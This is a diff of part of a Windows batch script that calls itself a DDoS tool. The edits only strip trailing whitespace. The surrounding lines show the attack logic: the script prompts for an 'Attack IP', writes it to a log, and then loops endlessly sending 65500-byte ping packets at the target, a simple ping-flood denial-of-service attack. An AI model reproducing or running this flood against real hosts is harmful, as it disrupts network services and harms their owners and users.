@@ -44,7 +44,7 @@ goto PreAttack
 :PreAttack
 cls
 echo ---Enter Attack IP---
-set /p AttackIP= 
+set /p AttackIP=
 Echo Attack IP set to %AttackIP%
 echo Attack IP set! >> log.txt
 echo IP: >> log.txt
@@ -63,7 +63,7 @@ goto Attack
 cls
 pause goto DDos
 
-:DDos 
+:DDos
 :loop
 ping %AttackIP% -l 65500 -w 1 -n 1
 goto :loop
